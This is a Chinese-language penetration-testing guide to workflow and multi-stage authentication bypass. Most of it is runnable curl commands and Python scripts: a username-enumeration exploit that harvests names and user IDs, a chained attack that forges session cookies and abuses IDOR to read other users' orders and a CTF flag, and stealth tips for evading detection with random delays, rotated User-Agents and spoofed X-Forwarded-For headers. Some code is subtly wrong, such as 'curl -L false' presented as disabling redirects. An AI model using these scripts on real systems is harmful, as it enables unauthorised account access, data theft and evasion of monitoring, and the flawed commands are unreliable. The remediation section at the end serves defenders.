# 工作流/上下文认证绕过方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的工作流/上下文认证绕过检测与利用流程，帮助发现和利用多阶段认证流程中的状态验证缺陷。

## 1.2 适用范围

本文档适用于所有使用多阶段认证流程的 Web 应用，特别是：
- 两阶段或多阶段登录流程
- 分步表单提交（如结账流程）
- 需要前置条件的敏感操作
- 密码重置/账户恢复流程

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

工作流/上下文认证绕过是指攻击者通过直接访问多阶段流程中的后续步骤，绕过前置认证或验证要求。

**本质问题**：
- 缺少工作流状态跟踪
- 未验证前置条件是否完成
- 过度依赖客户端状态管理
- 各阶段之间无令牌/会话标记传递

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-287 | 身份验证不当 |
| CWE-306 | 关键功能缺少认证 |
| CWE-841 | 行为执行顺序不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 两阶段登录 | 用户名验证 → 密码验证 | 直接访问密码页绕过用户名验证 |
| 密码重置 | 邮箱验证 → 重置表单 | 直接访问重置页面 |
| 购物结账 | 登录 → 地址 → 支付 → 确认 | 跳过登录直接结账 |
| 账户恢复 | 安全问题 → 新密码设置 | 绕过安全问题直接设置密码 |
| MFA 流程 | 密码验证 → OTP 输入 | 直接访问 OTP 页面 |
| 文件上传 | 认证 → 上传表单 → 确认 | 绕过认证直接上传 |

## 2.3 漏洞发现方法

### 2.3.1 工作流映射

```bash
# 步骤 1：完整执行正常流程，记录所有请求
# 使用 Burp Suite 或类似工具记录完整流程

# 正常两阶段登录流程：
# 1. GET / → 登录页面
# 2. POST / → 用户名验证
# 3. GET /password/{username} → 密码页面
# 4. POST /password/{username} → 密码验证
# 5. GET /dashboard → 登录成功

# 步骤 2：分析各阶段之间的状态传递
# - 是否有会话标记设置？
# - 是否有令牌传递？
# - 是否有时间戳/nonce 验证？
```

### 2.3.2 直接访问测试

```bash
# 测试 1：未认证状态下直接访问流程后续步骤
curl -v http://target.com/password/test
# 如果返回 200 OK 且显示密码输入框，存在绕过漏洞

# 测试 2：访问需要前置条件的页面
curl -v http://target.com/checkout/payment
# 如果无需登录即可访问支付页面，存在绕过

# 测试 3：访问多阶段流程的中间步骤
curl -v http://target.com/reset-password/step2
# 如果无需完成 step1 即可访问 step2，存在绕过
```

### 2.3.3 会话状态分析

```bash
# 步骤 1：获取初始会话
curl -c cookies.txt http://target.com/
echo "=== Initial cookies ==="
cat cookies.txt

# 步骤 2：完成第一阶段（用户名验证）
curl -b cookies.txt -c cookies.txt -X POST http://target.com/ -d "username=test"
echo "=== After stage 1 ==="
cat cookies.txt

# 步骤 3：分析 Cookie 变化
# 如果没有任何新 Cookie 或会话标记，可能存在状态跟踪缺陷
```

### 2.3.4 自动化检测脚本

```python
#!/usr/bin/env python3
"""
工作流认证绕过检测脚本
检测多阶段流程中的状态验证缺陷
"""

import requests
import sys

BASE_URL = 'http://target.com'

class WorkflowTester:
    def __init__(self):
        self.session = requests.Session()
        self.results = []
    
    def test_direct_access(self, url, description):
        """测试直接访问"""
        print(f"[*] Testing direct access to {url}")
        
        # 使用全新会话（无任何前置状态）
        fresh_session = requests.Session()
        
        try:
            response = fresh_session.get(f'{BASE_URL}{url}', timeout=10)
            
            if response.status_code == 200:
                # 检查是否返回了敏感内容
                sensitive_keywords = [
                    'password', 'confirm', 'reset', 'verify',
                    'step', 'stage', 'phase', 'next', 'continue'
                ]
                
                has_sensitive = any(
                    keyword in response.text.lower() 
                    for keyword in sensitive_keywords
                )
                
                if has_sensitive:
                    result = {
                        'url': url,
                        'status': 200,
                        'vulnerable': True,
                        'description': description
                    }
                    self.results.append(result)
                    print(f"[VULNERABLE] {url} - {description}")
                    return True
                else:
                    print(f"[INFO] {url} - 200 OK but no sensitive content")
            else:
                print(f"[SAFE] {url} - Status {response.status_code}")
                
        except Exception as e:
            print(f"[ERROR] {url} - {e}")
        
        return False
    
    def test_stage_bypass(self, stage_urls):
        """测试阶段绕过"""
        print(f"\n[*] Testing stage bypass for workflow with {len(stage_urls)} stages")
        
        for i, url in enumerate(stage_urls):
            if i == 0:
                continue  # 跳过第一阶段
            
            print(f"\n[*] Attempting to bypass to stage {i+1}: {url}")
            
            # 使用全新会话直接访问后续阶段
            fresh_session = requests.Session()
            
            try:
                response = fresh_session.get(f'{BASE_URL}{url}', timeout=10)
                
                if response.status_code == 200:
                    print(f"[VULNERABLE] Stage {i+1} accessible without completing previous stages")
                    self.results.append({
                        'type': 'stage_bypass',
                        'stage': i + 1,
                        'url': url,
                        'status': 200
                    })
                    
            except Exception as e:
                print(f"[ERROR] {url} - {e}")
    
    def test_parameter_manipulation(self, base_url, param_name, test_values):
        """测试参数操纵"""
        print(f"\n[*] Testing parameter manipulation for {param_name}")
        
        for value in test_values:
            url = f"{base_url}?{param_name}={value}"
            response = requests.get(f'{BASE_URL}{url}')
            
            if response.status_code == 200:
                print(f"[+] Parameter {param_name}={value} accepted")
    
    def generate_report(self):
        """生成测试报告"""
        print("\n" + "="*60)
        print("WORKFLOW BYPASS TEST REPORT")
        print("="*60)
        
        if not self.results:
            print("No vulnerabilities found.")
            return
        
        print(f"Found {len(self.results)} potential vulnerabilities:\n")
        
        for i, result in enumerate(self.results, 1):
            print(f"{i}. {result.get('url', 'N/A')}")
            print(f"   Type: {result.get('type', 'direct_access')}")
            print(f"   Status: {result.get('status', 'N/A')}")
            print()

def main():
    tester = WorkflowTester()
    
    # 测试两阶段登录流程绕过
    print("[*] Testing two-stage login workflow bypass...")
    tester.test_direct_access('/password/test', 'Direct access to password page')
    
    # 测试多阶段流程绕过
    stage_urls = [
        '/checkout/login',
        '/checkout/address',
        '/checkout/payment',
        '/checkout/confirm'
    ]
    tester.test_stage_bypass(stage_urls)
    
    # 生成报告
    tester.generate_report()

if __name__ == '__main__':
    main()
```

## 2.4 漏洞利用方法

### 2.4.1 两阶段登录绕过

```bash
# 场景：两阶段登录流程
# 正常流程：
# 1. POST / - 用户名验证
# 2. POST /password/{username} - 密码验证

# 利用方法：直接访问密码页面获取用户信息

# 步骤 1：直接访问密码页面（无需先提交用户名）
curl -v http://target.com/password/test

# 响应可能包含：
# - 用户真实姓名："Welcome, John!"
# - 用户 ID：<input name="user_id" value="10032" hidden>

# 步骤 2：提取敏感信息
curl -s http://target.com/password/test | grep -oP 'Welcome, \K[^!]+'
curl -s http://target.com/password/test | grep -oP 'value="\K\d+(?=")'
```

### 2.4.2 完整利用脚本

```python
#!/usr/bin/env python3
"""
两阶段登录流程绕过利用脚本
直接访问密码页面获取用户元数据
"""

import requests
import re
import sys

BASE_URL = 'http://target.com'

class WorkflowBypassExploit:
    def __init__(self):
        self.session = requests.Session()
    
    def enumerate_users(self, usernames):
        """枚举用户并提取信息"""
        results = []
        
        for username in usernames:
            print(f"[*] Testing username: {username}")
            
            try:
                # 直接访问密码页面（绕过用户名验证阶段）
                response = self.session.get(
                    f'{BASE_URL}/password/{username}',
                    allow_redirects=False,
                    timeout=10
                )
                
                if response.status_code == 200:
                    # 提取用户真实姓名
                    name_match = re.search(r'Welcome, ([^!]+)!', response.text)
                    first_name = name_match.group(1) if name_match else None
                    
                    # 提取用户 ID
                    id_match = re.search(r'name="user_id" value="(\d+)"', response.text)
                    user_id = id_match.group(1) if id_match else None
                    
                    if first_name or user_id:
                        result = {
                            'username': username,
                            'first_name': first_name,
                            'user_id': user_id
                        }
                        results.append(result)
                        print(f"[+] Found: {username} -> Name: {first_name}, ID: {user_id}")
                
                elif response.status_code == 302:
                    # 重定向可能表示用户不存在
                    print(f"[-] {username} - Redirected (may not exist)")
                
                elif response.status_code == 404:
                    print(f"[-] {username} - 404 Not Found")
                
            except Exception as e:
                print(f"[ERROR] {username} - {e}")
        
        return results
    
    def generate_report(self, results):
        """生成信息收集报告"""
        print("\n" + "="*60)
        print("USER INFORMATION DISCLOSURE REPORT")
        print("="*60)
        
        if not results:
            print("No information disclosed.")
            return
        
        print(f"Disclosed {len(results)} user records:\n")
        
        for record in results:
            print(f"Username: {record['username']}")
            if record['first_name']:
                print(f"  First Name: {record['first_name']}")
            if record['user_id']:
                print(f"  User ID: {record['user_id']}")
            print()
    
    def run(self, usernames):
        """执行完整利用"""
        print(f"[*] Starting workflow bypass attack with {len(usernames)} usernames")
        
        results = self.enumerate_users(usernames)
        self.generate_report(results)
        
        return results

def main():
    # 常见用户名列表
    default_usernames = [
        'test', 'admin', 'administrator', 'root',
        'user', 'guest', 'demo', 'info'
    ]
    
    # 从文件加载用户名
    if len(sys.argv) > 1:
        with open(sys.argv[1], 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        usernames = default_usernames
    
    exploit = WorkflowBypassExploit()
    exploit.run(usernames)

if __name__ == '__main__':
    main()
```

### 2.4.3 结合其他漏洞利用

```python
#!/usr/bin/env python3
"""
组合攻击：工作流绕过 + IDOR + 会话伪造
"""

import requests
from itsdangerous import URLSafeTimedSerializer

BASE_URL = 'http://target.com'
SECRET_KEY = 'your_secret_key'

def chain_attack():
    """执行组合攻击"""
    
    # 步骤 1：工作流绕过 - 获取用户信息
    print("[*] Stage 1: Workflow bypass for user enumeration")
    response = requests.get(f'{BASE_URL}/password/test')
    
    import re
    user_id_match = re.search(r'value="user_id" value="(\d+)"', response.text)
    target_user_id = user_id_match.group(1) if user_id_match else '10032'
    print(f"[+] Target user ID: {target_user_id}")
    
    # 步骤 2：会话伪造 - 创建目标用户会话
    print("\n[*] Stage 2: Session forgery")
    serializer = URLSafeTimedSerializer(
        secret_key=SECRET_KEY,
        salt='cookie-session'
    )
    forged_session = serializer.dumps({'user_id': int(target_user_id)})
    print(f"[+] Forged session: {forged_session}")
    
    # 步骤 3：IDOR - 访问目标用户资源
    print("\n[*] Stage 3: IDOR exploitation")
    session = requests.Session()
    session.cookies.set('session', forged_session)
    
    # 访问订单归档（IDOR 漏洞）
    response = session.get(f'{BASE_URL}/order/300198/archive')
    if response.status_code == 200:
        print("[+] Successfully archived target order")
    
    # 访问订单收据
    response = session.get(f'{BASE_URL}/order/300198/receipt')
    if response.status_code == 200:
        print("[+] Successfully accessed target receipt")
        
        # 提取 CTF flag
        flag_match = re.search(r'FLAG\{[a-f0-9]+\}', response.text)
        if flag_match:
            print(f"[SUCCESS] CTF Flag: {flag_match.group(0)}")
    
    return True

if __name__ == '__main__':
    chain_attack()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过重定向检查

```bash
# 如果直接访问被重定向，尝试以下方法

# 1. 禁用重定向
curl -L false http://target.com/password/test

# 2. 添加特定请求头
curl -H "X-Requested-With: XMLHttpRequest" http://target.com/password/test

# 3. 尝试不同 HTTP 方法
curl -X POST http://target.com/password/test
```

### 2.5.2 绕过会话检查

```python
# 如果页面检查会话状态，尝试以下方法

# 1. 使用空会话
requests.get(url, cookies={})

# 2. 使用伪造会话
session_cookie = forge_session({'user_id': None})
requests.get(url, cookies={'session': session_cookie})

# 3. 修改请求来源
headers = {
    'Referer': 'http://target.com/',
    'X-Forwarded-For': '127.0.0.1'
}
```

### 2.5.3 隐蔽测试技巧

```python
# 降低测试频率避免检测
import time
import random

def stealth_test(urls):
    for url in urls:
        # 随机延迟
        time.sleep(random.uniform(1, 3))
        
        # 随机 User-Agent
        headers = {'User-Agent': get_random_ua()}
        
        # 执行测试
        requests.get(f'{BASE_URL}{url}', headers=headers)
```

---

# 第三部分：附录

## 3.1 工作流绕过测试检查清单

```
□ 识别所有多阶段流程
□ 绘制完整工作流程图
□ 标记各阶段之间的状态传递
□ 测试直接访问后续阶段
□ 测试跳过中间阶段
□ 测试参数操纵绕过
□ 测试会话状态依赖
□ 测试时间窗口限制
```

## 3.2 常见工作流漏洞模式

| 流程类型 | 漏洞模式 | 利用方法 |
|---------|---------|---------|
| 两阶段登录 | 无状态标记 | 直接访问阶段 2 |
| 密码重置 | 令牌验证缺失 | 跳过邮箱验证 |
| 购物结账 | 登录检查缺失 | 直接支付 |
| 文件上传 | 认证检查缺失 | 直接上传 |
| MFA 流程 | 阶段隔离缺失 | 绕过 MFA |

## 3.3 修复建议

1. **实施状态跟踪** - 在会话中设置状态标记验证流程进度
2. **令牌验证** - 各阶段之间传递一次性令牌
3. **服务端验证** - 每个阶段验证前置条件是否完成
4. **超时机制** - 设置流程完成时间窗口
5. **统一入口** - 所有阶段通过统一控制器管理
